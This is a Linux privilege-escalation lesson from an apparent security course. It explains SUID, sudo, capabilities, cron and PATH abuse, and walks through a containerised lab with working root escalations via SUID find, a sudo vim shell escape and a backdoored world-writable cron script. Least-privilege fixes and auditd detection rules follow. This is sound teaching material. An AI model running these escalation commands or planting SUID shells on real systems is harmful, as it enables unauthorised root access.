# Day 5 — Linux/OS Security & Privilege Escalation

## Objectives

By the end of today you should be able to:

- Explain precisely what the **SUID**/**SGID** bits do — that they run a program with
  the *file's owner's* privileges instead of the *caller's* — and why that makes
  `-exec`-style flags on ordinary tools (`find`, `vim`, `less`, dozens more) a
  privilege-escalation primitive the moment the SUID bit is set on them.
- Read a `sudo -l` line and a `find / -perm -4000` line and say, specifically, whether
  each one is exploitable, and if so, name its exact **GTFOBins** entry.
- Escalate from a low-privilege shell to `uid=0` via three independent, planted
  vectors on today's target: a SUID binary, a sudo misconfiguration, and a
  world-writable script on root's crontab — and say which mechanism (elevated
  effective UID vs. sudo's own elevation vs. root's cron literally executing
  attacker-controlled content) each one actually relies on.
- Name the **least-privilege** fix for each vector, and say why "remove the
  unnecessary privilege" beats "detect the misuse after the fact" as a first-line
  defense — while still describing what **auditd** would show if you had to catch
  this after the fact anyway.
- Explain **PATH abuse** as a fourth, related-but-distinct mechanism, without a live
  target for it today — the same "reasoned through, not attacked live" honesty this
  path has used for concepts a given day's lab doesn't happen to demonstrate hands-on.

## 1. Concept — Users, Permissions, SUID/SGID, Sudo, Capabilities, Cron, PATH

### The permission model this all sits on top of

Every Linux process runs with a **real UID** (whose privileges it *should* have) and
an **effective UID** (whose privileges it *actually* has for permission checks *right
now*). For almost every process these are identical — you run a program, it runs as
you. **SUID** ("set user ID") is a special permission bit on an executable file that
breaks that equivalence on purpose: when a SUID binary runs, its effective UID becomes
the *file's owner*, not the caller's, for as long as it runs. **SGID** ("set group
ID") is the identical idea one level down — the process's effective *group* becomes
the file's group. `passwd` is the textbook legitimate use of SUID: it needs to write
to `/etc/shadow` (root-owned, root-only-writable) on behalf of any user changing their
own password, so it's SUID-root — every non-root user who runs `passwd` briefly *is*
root, but only inside `passwd`'s own tightly-scoped code, which never lets that
elevated privilege do anything except the one narrow task it exists for.

The bug class today's whole lab is about is exactly this: **a SUID binary whose own
code lets the caller do something broader than the one narrow task it was meant for.**
`find` was never designed with privilege escalation in mind — its `-exec` flag is a
completely ordinary, everyday feature (`find . -name '*.log' -exec rm {} \;`) that
happens to run its given command with `find`'s *own* effective privileges. That's
invisible and harmless when `find` isn't SUID. The instant it is, `-exec` becomes "run
any command as `find`'s owner" — and if that owner is root, it's a full escalation
with a single line, using nothing but a command every sysadmin already has memorized.

### GTFOBins — the map of which binaries are dangerous when SUID (or sudo-able)

**GTFOBins** ([gtfobins.github.io](https://gtfobins.github.io/)) is a curated,
crowdsourced catalog of Unix binaries and the exact commands that turn each one into a
privilege-escalation or restriction-bypass primitive, *when* that binary is reachable
in an unusually privileged way — SUID, a passwordless sudo rule, a capability (next
section), or even just being run inside a restricted shell. It's organized *by
binary*: look up `find`, and it lists the exact `-exec /bin/sh -p \; -quit` payload
for the SUID case, a separate payload for the sudo case, and more for other contexts.
The lesson GTFOBins actually teaches isn't "these specific binaries are dangerous" — it's
that **any sufficiently flexible program that can execute another program on your
behalf inherits whatever privilege it's running with**, and a surprising number of
completely ordinary tools (`vim`, `less`, `awk`, `python3`, `tar`, `find`, dozens
more) have exactly that flexibility. Enumeration's whole job on a real box is finding
which binaries on *that specific host* happen to be SUID or sudo-able, then checking
each one against GTFOBins.

### `sudo` — deliberate, scoped privilege elevation (and how the scoping fails)

`sudo` is the *intended* mechanism for a non-root user to run specific things as root,
governed by `/etc/sudoers` (or, more commonly today, individual files under
`/etc/sudoers.d/`). A well-written rule names an exact command, sometimes with exact
arguments locked down too: `alice ALL=(root) /usr/bin/systemctl restart nginx` lets
Alice restart nginx as root and *nothing else*. The misconfiguration this lab plants —
`lowpriv ALL=(root) NOPASSWD: /usr/bin/vim` — names a whole general-purpose editor with
no argument restriction at all, and `NOPASSWD` removes even the friction of
re-entering a password. The rule is technically "scoped" to one binary, but that binary
is itself a GTFOBins entry — the scoping is real but useless, because the thing it
scoped down to can still do anything.

### Capabilities — SUID's narrower, less-blunt cousin

Linux **capabilities** split up the monolithic "root can do anything" privilege into
dozens of individually grantable pieces — `CAP_NET_BIND_SERVICE` (bind ports below
1024), `CAP_SETUID` (change a process's UID), `CAP_DAC_OVERRIDE` (bypass file
permission checks), and many more. A binary can be granted exactly one narrow
capability (`setcap cap_net_bind_service+ep /usr/bin/myserver`) instead of being made
fully SUID-root — letting `myserver` bind port 80 without being able to do anything
else root can do. This is strictly better security hygiene than SUID when the goal is
narrow: SUID is all-or-nothing (the file's *entire* owner-privilege set, for the whole
process), capabilities let you grant only the one piece actually needed. The trap:
some individual capabilities are functionally equivalent to full root anyway —
`CAP_SETUID` alone, on a binary an attacker can also make execute arbitrary code, lets
that process simply call `setuid(0)` itself, which is a full escalation with extra
steps. "Uses capabilities instead of SUID" is a good sign on its own, but it isn't
automatically safe — it depends entirely on *which* capability.

### Cron and PATH abuse — root's own automation, subverted

`cron` runs scheduled jobs, frequently as root, because root-owned automation
(backups, log rotation, certificate renewal) is completely normal. Two distinct bugs
turn that normal automation into a privilege-escalation vector, and this lab plants
one of them live:

- **A world-writable script a root cron job invokes** (this lab's Vector 3) — the job
  itself, and root running it, are both fine; the bug is that the *file* root executes
  is writable by someone other than root. Rewrite the file, and root's own scheduler
  runs your content, on its own schedule, without you ever needing to touch anything
  as root directly.
- **PATH abuse** (named here, not demonstrated live today — see Drill 4) — a subtly
  different bug: a script (cron-run or otherwise, running as root) invokes a command
  by its **bare name** (`backup-helper`, not `/usr/local/bin/backup-helper`), relying
  on the shell's `$PATH` to find it. If any directory *earlier* in root's `$PATH` than
  the real binary's directory is writable by a non-root user, that user can drop a
  malicious file with the exact same bare name into that earlier directory, and root's
  shell finds and runs the attacker's version first — never touching the real,
  legitimate binary at all. The fix for both bugs is the same principle
  (least-privilege on the filesystem: nothing root executes should be writable by
  anyone else), even though the mechanics of *how* the attacker's content gets run
  differ.

### Least privilege and `auditd` — remove the hole vs. watch the hole

**Least privilege** is the umbrella principle behind every fix in Section 3: grant the
absolute minimum privilege a task requires, and nothing more — no SUID bit unless a
program genuinely needs to run as a different user for its entire runtime, no
unscoped sudo rule when a scoped one would do, no world-writable file that root ever
executes. It's a *removal*, not a detection — the escalation becomes impossible, not
merely noisy. **`auditd`** is the complementary, second-line control: a kernel-level
audit framework that, given rules watching specific syscalls or files (`execve` calls
where `euid != ruid`, writes to specific paths), logs privileged actions for later
review or alerting. `auditd` doesn't stop today's three vectors from working — it
only ever tells you, after the fact, that they were used. Today's target ships
`auditd` installed but with no rules configured, deliberately — a common, real
gap this lab names rather than glosses over; Drill 3 and this lab's `SOLUTION.md`
work through exactly what a configured rule would have shown for each vector.

## 2. Attack Lab — Enumerate, Then Escalate Three Independent Ways

**Authorized use only:** everything below runs against `target`, the container this
lab starts on the shared `cyberlab` network — never against a host you don't own or
don't have explicit written authorization to test.

**Read this before you start — today's commands are structured differently from every
earlier day.** Days 1–4 always ran `docker compose exec attacker ...` from
`labs/base`, reaching `target` over the network. Today's escalation is **local** —
there's no network hop, because the whole point is what you can do once you already
have *a* shell on the box. So today you'll exec directly into `target` itself,
**from `labs/day05`** (where `target`'s own compose project lives), not from
`labs/base`. Full detail: [`labs/day05/README.md`](../labs/day05/README.md).

```sh
cd cyber_security/labs/base
./up.sh
cd ../day05
docker compose up -d --build
```

(Optional) fetch `linpeas.sh` — see [`labs/day05/tools/README.md`](../labs/day05/tools/README.md):

```sh
cd ../base
docker compose exec attacker sh -c "mkdir -p /loot/day05 && curl -sL -o /loot/day05/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x /loot/day05/linpeas.sh"
```

### Step 1 — Get your foothold and confirm the vectors are planted

```sh
cd ../day05
docker compose exec target sh -c "test -u /usr/bin/find && echo VULN_PRESENT"
docker compose exec target su - lowpriv
```

**What you should see:** `VULN_PRESENT`, then a shell as `lowpriv` (password
`lowpriv`). Confirm with `id`: `uid=1000(lowpriv) gid=1000(lowpriv)
groups=1000(lowpriv)` — an ordinary, unprivileged account, exactly the position a real
attacker lands in after a successful web/auth foothold (Days 1, 4, 7–9's job, not
today's).

### Step 2 — Enumerate

```sh
find / -perm -4000 -type f 2>/dev/null
sudo -l
ls -la /etc/cron.d/ /opt/scripts/
```

**What you should see:** `/usr/bin/find` in the SUID listing — abnormal, since a stock
Debian image never SUIDs `find` — alongside ordinary, expected entries like
`/usr/bin/passwd` and `/usr/bin/sudo` (Drill 1 asks you to tell these apart from
memory). `sudo -l` shows `(root) NOPASSWD: /usr/bin/vim`. `ls -la /opt/scripts/`
shows `backup.sh` at mode `777`. If you fetched it, `sh /loot/day05/linpeas.sh -q`
flags all three in its own output — a cross-check, not a replacement, for the manual
commands above.

### Step 3 — Vector 1 (PRIMARY): SUID `find`

```sh
find . -exec /bin/sh -p \; -quit
id
```

**What you should see:** a new shell, then `uid=0(root) gid=1000(lowpriv)
groups=1000(lowpriv)` — full root. The `-p` flag on `/bin/sh` matters specifically
because Debian's `/bin/sh` is dash, and dash's default behavior when real and
effective UID differ is to drop straight back down to the real UID on startup —
`-p` is what tells it not to. Omit `-p` and you get a shell, but it's `uid=1000`, not
`uid=0` — a realistic, easy-to-hit dead end if you don't know why it matters, named
here so you don't have to hit it yourself first.

### Step 4 — Vector 2: sudo `vim`

```sh
sudo vim -c ':!/bin/sh'
id
```

**What you should see:** `uid=0(root) gid=0(root) groups=0(root)`. `sudo` already
elevated the whole `vim` process before it even started (that's what the sudoers rule
grants); vim's `:!<cmd>` runs a subshell that inherits whatever privilege the parent
process — root, right now — already has.

### Step 5 — Vector 3: world-writable cron script

```sh
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/scripts/backup.sh
sleep 65
/tmp/rootbash -p
id
```

**What you should see:** after the ~60-second wait for cron's next minute tick,
`/tmp/rootbash` exists with the SUID bit set (root created it — cron ran the
appended line *as root*), and `/tmp/rootbash -p` gives `uid=0(root)
gid=1000(lowpriv) groups=1000(lowpriv)`. This is the only one of the three vectors
where the attacker never runs a single command as root directly — root's own
scheduler does the privileged work, on schedule, unmodified.

### Verify

```sh
cd cyber_security/labs/day05
docker compose exec target sh -c "test -u /usr/bin/find && echo VULN_PRESENT"
```

Expected: `VULN_PRESENT` — confirms Vector 1 is planted in a fresh build, independent
of whether it's been exploited in this particular session. Full detail (all three
vectors' exact expected output, and an explicit note on what has and hasn't been
live-verified for this lab): [`labs/day05/SOLUTION.md`](../labs/day05/SOLUTION.md).

## 3. Defense Lab — Remove the Privilege, Then Say What Auditd Would Have Shown

### Defense 1 — remove the SUID bit (least privilege, Vector 1)

```sh
docker compose exec target sh -c "chmod u-s /usr/bin/find"
docker compose exec target sh -c "test -u /usr/bin/find && echo STILL_VULN || echo FIXED"
```

**What you should see:** `FIXED`. Re-running Step 3's exact `find . -exec /bin/sh -p
\; -quit` afterward drops you into a shell at `uid=1000`, not `uid=0` — `find` still
runs `-exec` exactly as before; there's simply no elevated effective UID left for it
to inherit. `find` never needed the SUID bit for its actual job — this fix removes a
capability that was never load-bearing in the first place, which is what makes it
strictly better than trying to detect misuse of it after the fact.

### Defense 2 — remove or scope the sudo rule (Vector 2)

```sh
docker compose exec target sh -c "rm /etc/sudoers.d/lowpriv"
```

**What you should see:** `sudo -l` as `lowpriv` afterward shows no entries at all;
`sudo vim ...` now fails outright. If `lowpriv` genuinely needed *some* narrower root
capability, the better real-world fix is scoping the rule down to a specific,
non-shell-escaping command and arguments — not simply deleting it — see Drill 2.

### Defense 3 — fix the script's permissions (Vector 3)

```sh
docker compose exec target sh -c "chmod 700 /opt/scripts/backup.sh"
```

**What you should see:** `lowpriv` can no longer write to `backup.sh`; root's cron job
keeps running the *original*, now-unmodifiable script every minute exactly as
intended. The fix removes only the excess write permission — the legitimate backup
job itself is untouched.

### `auditd` — the second-line control, named precisely

`auditd` is installed on today's target but ships with no rules configured — a
deliberate, honest choice: it's a common real-world gap, not a hidden feature this lab
pretends is already working. A configured rule watching privileged `execve` calls
(specifically, where a process's effective UID doesn't match its real UID —
`auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -C uid!=euid -k privesc`)
would show, for each vector: Vector 1 — an `execve` of `/bin/sh` with `euid=0` but
`ruid=1000`, the single strongest generic signal for *any* SUID-abuse escalation, not
just this specific binary; Vector 2 — `sudo`'s own log entry naming `lowpriv` running
`/usr/bin/vim` as `root`, independent of auditd entirely (`sudo` logs its own
invocations by design); Vector 3 — a `write` syscall against
`/opt/scripts/backup.sh` by `lowpriv`, followed roughly a minute later by an `execve`
of that same path with `ruid=0`. None of these entries would have *stopped* the
escalation — that's what Defenses 1–3 are for — but each would have made it visible
after the fact, which matters for detection (Day 11) even when prevention has already
failed.

## 4. Drills

Attempt each drill yourself before reading its solution sketch.

### Drill 1 — Pick the exploitable binary out of a real `find -perm -4000` listing

You run `find / -perm -4000 -type f 2>/dev/null` on a box and get:

```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/find
/usr/bin/mount
/usr/bin/umount
```

Every one of these has its SUID bit set. Which single line is the actual planted
vulnerability, and what's the exact exploit command from its GTFOBins entry?

**Hint:** most of this list is *supposed* to be SUID — `passwd` needs to write
`/etc/shadow` on anyone's behalf, `mount`/`umount` need kernel-level privilege for an
ordinary user to mount removable media, `sudo` and `gpasswd`/`chsh` are similarly
narrow-by-design. Ask which one has no legitimate reason to run arbitrary attacker-
controlled commands as its own privileged self.

**Solution sketch:** `/usr/bin/find` is the exploitable one — `passwd`, `sudo`,
`gpasswd`, `chsh`, `mount`, and `umount` being SUID is completely normal on almost
any real Linux system and is not, by itself, a vulnerability (each is narrowly scoped
to one task that genuinely needs elevated privilege). `find` has no such legitimate
reason: it's a general-purpose search tool with an `-exec` flag that runs arbitrary
commands, and being SUID turns that ordinary flag into an escalation primitive. The
exact GTFOBins payload: `find . -exec /bin/sh -p \; -quit` (the `-p` on `/bin/sh`
matters — see Section 2 Step 3).

### Drill 2 — Fix the sudo misconfiguration without removing `lowpriv`'s ability to edit config files

Suppose `lowpriv` has a legitimate, narrow need: editing one specific config file,
`/etc/myapp/config.yml`, as root, via an editor. `lowpriv ALL=(root) NOPASSWD:
/usr/bin/vim` is today's actual (broken) rule. Write a *scoped* replacement that
still lets `lowpriv` do their real job but removes the GTFOBins escape.

**Hint:** GTFOBins' vim entry works because vim, once running, can shell out or open
*any* file, not just the one you launched it on. What sudo feature restricts which
*arguments* a rule accepts, and is there a tool built for exactly "edit one file as
root, safely" that doesn't have vim's general-purpose escape hatches?

**Solution sketch:** two real fixes, in increasing order of robustness. The narrowest
useful improvement to the existing rule is locking the argument down to the one file:
`lowpriv ALL=(root) NOPASSWD: /usr/bin/vim /etc/myapp/config.yml` — this stops
`sudo vim` (no argument) from opening an interactive root-privileged editor on
anything at all, but is still not fully safe, since vim, even opened on that one
file, can still `:!/bin/sh` or `:e /etc/shadow` once running. The robust fix is to
stop using a general-purpose editor for this at all: `sudoedit` (or `sudo -e`) is
purpose-built for exactly this case — it copies the target file to a temporary
location, lets the user edit that copy with their *own* (non-root) privileges in
their normal `$EDITOR`, then copies the result back as root only if it validates —
the user's editor process itself never runs as root, so there's no privileged shell-
escape surface at all: `lowpriv ALL=(root) NOPASSWD: sudoedit /etc/myapp/config.yml`.

### Drill 3 — What would `auditd` log for the SUID `find` escalation, specifically?

Given a rule `auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -C uid!=euid -k
privesc`, name the specific field values you'd expect in the log entry generated by
Section 2 Step 3's `find . -exec /bin/sh -p \; -quit`, and explain why this one rule
would also catch Vector 3's cron exploit, unmodified.

**Hint:** the rule doesn't mention `find`, `sh`, or `backup.sh` by name anywhere —
what condition is it actually checking, and does that condition depend on which
binary triggered it?

**Solution sketch:** the log entry would show an `execve` syscall record for
`/bin/sh` (the `-p`-flagged shell `find -exec` launches), with `uid=1000` (the real,
logged-in identity — `lowpriv`) but `euid=0` (root, inherited from `find`'s SUID bit)
— exactly the mismatch the `-C uid!=euid` condition is watching for. This same rule
also catches Vector 3 unmodified because it never names a specific binary at all — it
fires on *any* process whose effective UID doesn't match its real UID at the moment
of `execve`, which is the generic fingerprint of privilege elevation via SUID (or a
comparable mechanism) regardless of which specific program triggers it. (Vector 2's
`sudo` usage is caught by a completely separate mechanism — `sudo`'s own built-in
logging, not this particular `auditd` rule — because `sudo` re-execs the target
command with a *new* process whose real and effective UID are both already `0` by
the time it starts, so there's no UID mismatch for this rule to catch; sudo's own log
line is what surfaces that one instead.)

### Drill 4 — PATH abuse: find the bug and fix it

A root-owned cron job runs this script every night:

```sh
#!/bin/sh
cd /var/backups
backup-helper --compress
```

`backup-helper` is a real, legitimate binary installed at
`/usr/local/bin/backup-helper`. Someone notices `/var/backups` is world-writable.
Explain the exact escalation path this enables, and give the one-line fix.

**Hint:** the script calls `backup-helper` by its bare name, not a full path — where
does the shell look for a bare-named command, and in what order?

**Solution sketch:** the shell resolves a bare command name by searching each
directory listed in `$PATH`, **in order**, and running the first match it finds.
`cd /var/backups` at the top of the script changes the *working directory*, and if
`.` (the current directory) appears anywhere in root's `$PATH` — a common,
still-seen misconfiguration — a writable `/var/backups` lets any local user drop
their own file named `backup-helper` right there. If `.` comes before
`/usr/local/bin` in `$PATH`, root's shell finds and runs the attacker's fake
`backup-helper` instead of the real one, as root, the very next time cron fires —
without ever touching the real binary or needing SUID/sudo at all. The one-line fix:
call the binary by its **full, absolute path** in the script —
`/usr/local/bin/backup-helper --compress` — which bypasses `$PATH` search entirely,
so a writable working directory (or a `.`-containing `$PATH`) can no longer matter,
regardless of what an attacker places there.

## 5. Journal Prompt

Open `journal.md` and write today's entry using the template at the top of that file:

- **What I attacked:** name specifically which of the three vectors you actually got a
  root shell from, and in what order — versus which one (PATH abuse) you only
  reasoned through via Drill 4, not against a live target. Being precise about which
  was hands-on and which was conceptual is the same honesty habit Days 3 and 4 asked
  for.
- **How:** walk through the `-p` flag gotcha on `/bin/sh`/`bash` (Steps 3 and 5) — what
  would you have actually observed if you'd forgotten it, and how would you have
  known to add it back?
- **What defended it:** of today's three defenses, which one did you personally apply
  and re-verify, and what changed in the observed output before vs. after?
- **What confused me:** anything about *why* the exact same `auditd` rule catches both
  Vector 1 and Vector 3 but not Vector 2, or about capabilities being "narrower than
  SUID but not automatically safe," that didn't click on first pass.
- **One thing to revisit:** pick one term from today (SUID/SGID, capability,
  GTFOBins, privilege escalation, least privilege, auditd) to re-explain from memory
  before Day 6.
